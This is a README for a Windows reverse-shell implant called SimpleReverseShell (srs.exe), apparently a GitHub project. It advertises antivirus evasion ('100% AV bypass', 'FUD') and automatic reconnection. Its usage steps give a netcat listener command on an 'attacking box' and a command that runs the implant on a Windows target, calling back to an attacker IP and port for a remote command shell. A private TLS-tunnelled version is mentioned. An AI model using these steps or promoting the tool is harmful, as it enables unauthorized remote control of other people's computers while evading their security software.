# SimpleReverseShell
py based rev cmd shell w/bare minimal dependencies x86_x64

Rumored to be Miley's favorite command shell.

![alt tag](http://i.imgur.com/sqov7iX.jpg)

100% AV bypass

![alt tag](http://i.imgur.com/GlkEB0q.png)

Usage:
Start a generic listener on your attacking box to catch the incoming connection. 
#nc -lvp 58931

![alt tag](http://i.imgur.com/j2aG99m.png)

Upload srs.exe to your Windows target (x86 or x64) and specifiy a remote host and remote port 
#srs.exe 192.168.0.5 58931

![alt tag](http://i.imgur.com/0KDbncP.png)

The listener receives the shell and you may begin executing commands. #hacktheplanet

![alt tag](http://i.imgur.com/NVQqBOb.png)

Easy as pie. The core feature of the shell is it's resilience to CTRL+C sighups.
Additionally, the implant will re-iniatiate connection every 5 seconds if the socket dies. Ncat is a fantastic tool, but I find that the best software does one thing and does that one thing well. Ergo srs. 

Public version sends traffic over clear-text, private version establishes an authenticated ssh style TLS tunnel.

Simple. Portable. Resilient. FUD.



